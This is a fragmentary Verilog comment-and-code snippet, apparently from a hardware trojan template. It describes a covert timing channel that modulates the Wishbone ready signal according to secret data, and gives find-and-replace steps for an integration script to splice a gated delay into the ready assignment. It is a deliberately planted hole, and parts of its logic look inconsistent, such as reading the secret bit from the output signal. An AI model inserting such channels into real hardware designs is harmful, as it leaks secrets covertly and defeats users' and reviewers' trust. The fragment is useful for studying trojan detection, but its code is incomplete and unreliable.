 ...
 * Payload: Modulate timing of ready_wb_o based on secret data
 * 
...
assign secret_bit = ready_wb_o[0];
...
// ============================================================
// Covert Channel: Modulate timing of ready_wb_o
//
// Integration Script Must Modify:
//
// IF ready_wb_o is timing-sensitive:
//   Find: assign ready_wb_o = ready_signal;
//   Replace: assign ready_wb_o = (timing_delay == 0) ? ready_signal : 1'b0;
//
